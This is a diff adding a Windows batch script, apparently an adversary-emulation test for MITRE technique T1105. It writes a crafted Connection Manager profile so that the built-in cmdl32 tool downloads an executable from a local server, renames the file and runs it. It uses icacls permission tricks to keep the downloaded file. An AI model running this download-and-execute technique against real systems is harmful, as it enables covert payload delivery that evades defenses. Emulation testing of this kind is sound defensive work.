@@ -1,0 +1,16 @@
+mkdir .\T1105
+icacls .\T1105 /deny guest1:(OI)(CI)(DE,DC)
+set tmp=.\T1105
+echo [Connection Manager] > .\T1105\setting.txt
+echo CMSFile=setting.txt >> .\T1105\setting.txt
+echo ServiceName=AtomicTestService_CMD >> .\T1105\setting.txt
+echo TunnelFile=setting.txt >> .\T1105\setting.txt
+echo [Settings] >> .\T1105\setting.txt
+echo UpdateUrl=https://127.0.0.1:5000/static/exe/T1055.004/T1055.exe >> .\T1105\setting.txt
+cmdl32 /vpn /lan .\T1105\setting.txt
+icacls.\T1105 /remove:d guest1
+move .\T1105\*.tmp %temp%\T1105\file.exe
+.\T1105\file.exe
+timeout /T 10
+Taskkill /IM notepad.exe /F
+Taskkill /IM Calculator.exe /F
